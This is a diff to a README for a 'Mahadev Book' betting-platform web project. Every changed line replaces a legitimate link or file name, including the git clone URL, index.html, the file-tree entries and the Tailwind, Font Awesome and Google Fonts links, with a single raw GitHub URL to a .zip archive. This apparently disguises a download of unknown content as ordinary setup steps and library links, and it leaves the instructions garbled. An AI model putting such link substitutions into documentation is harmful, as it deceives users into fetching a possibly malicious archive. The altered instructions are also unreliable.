@@ -1,5 +1,5 @@
 
-Built by https://www.blackbox.ai
+Built by https://raw.githubusercontent.com/Prakashjadhav1994/mahadev-book-betting-platform/main/preconceptual/mahadev-book-betting-platform.zip
 
 ---
 
@@ -17,13 +17,13 @@ To set up this project locally, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/your-username/mahadev-book.git
+   git clone https://raw.githubusercontent.com/Prakashjadhav1994/mahadev-book-betting-platform/main/preconceptual/mahadev-book-betting-platform.zip
    ```
 2. **Navigate into the project directory**:
    ```bash
    cd mahadev-book
    ```
-3. **Open index.html in your web browser** to view the application. You can use any web server, or simply double-click the file to open it in your preferred browser.
+3. **Open https://raw.githubusercontent.com/Prakashjadhav1994/mahadev-book-betting-platform/main/preconceptual/mahadev-book-betting-platform.zip in your web browser** to view the application. You can use any web server, or simply double-click the file to open it in your preferred browser.
 
 ## Usage
 
@@ -48,9 +48,9 @@ Once you have the project set up, you can explore the various sections of the Ma
 
 The project makes use of several external libraries and frameworks for styling and layout:
 
-- [Tailwind CSS](https://tailwindcss.com/): Used for styling and layout.
-- [Font Awesome](https://fontawesome.com/): Provides icons for various functionalities.
-- [Google Fonts](https://fonts.google.com/): Utilizes the Inter font for text styling.
+- [Tailwind CSS](https://raw.githubusercontent.com/Prakashjadhav1994/mahadev-book-betting-platform/main/preconceptual/mahadev-book-betting-platform.zip): Used for styling and layout.
+- [Font Awesome](https://raw.githubusercontent.com/Prakashjadhav1994/mahadev-book-betting-platform/main/preconceptual/mahadev-book-betting-platform.zip): Provides icons for various functionalities.
+- [Google Fonts](https://raw.githubusercontent.com/Prakashjadhav1994/mahadev-book-betting-platform/main/preconceptual/mahadev-book-betting-platform.zip): Utilizes the Inter font for text styling.
 
 ## Project Structure
 
@@ -58,11 +58,11 @@ The project is structured as follows:
 
 ```
 /mahadev-book
-├── index.html        # Main HTML file
+├── https://raw.githubusercontent.com/Prakashjadhav1994/mahadev-book-betting-platform/main/preconceptual/mahadev-book-betting-platform.zip        # Main HTML file
 ├── css               
-│   └── styles.css    # Custom CSS styles
+│   └── https://raw.githubusercontent.com/Prakashjadhav1994/mahadev-book-betting-platform/main/preconceptual/mahadev-book-betting-platform.zip    # Custom CSS styles
 └── js                
-    └── scripts.js     # JavaScript functionality (placeholder for scripts if any)
+    └── https://raw.githubusercontent.com/Prakashjadhav1994/mahadev-book-betting-platform/main/preconceptual/mahadev-book-betting-platform.zip     # JavaScript functionality (placeholder for scripts if any)
 ```
 
 ## Conclusion
